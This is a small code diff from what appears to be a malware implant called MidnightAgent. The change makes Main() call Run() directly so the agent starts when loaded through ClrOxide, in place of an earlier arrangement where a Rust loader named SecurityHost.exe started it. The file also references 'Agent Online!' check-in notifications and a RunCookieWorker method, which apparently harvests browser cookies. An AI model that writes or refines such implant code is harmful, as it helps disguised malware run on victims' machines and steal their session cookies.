@@ -76,9 +76,9 @@ namespace MidnightAgent
                 return;
             }
 
-            // Main() is only for worker sub-processes
-            // Agent is started exclusively via Run() from Rust Loader (SecurityHost.exe)
-            // This prevents duplicate "Agent Online!" notifications
+            // When executed by ClrOxide, Main() becomes the entry point
+            // The Run method handles duplicate instances via Mutex
+            Run("");
         }
 
         static void RunCookieWorker(string zipPath)
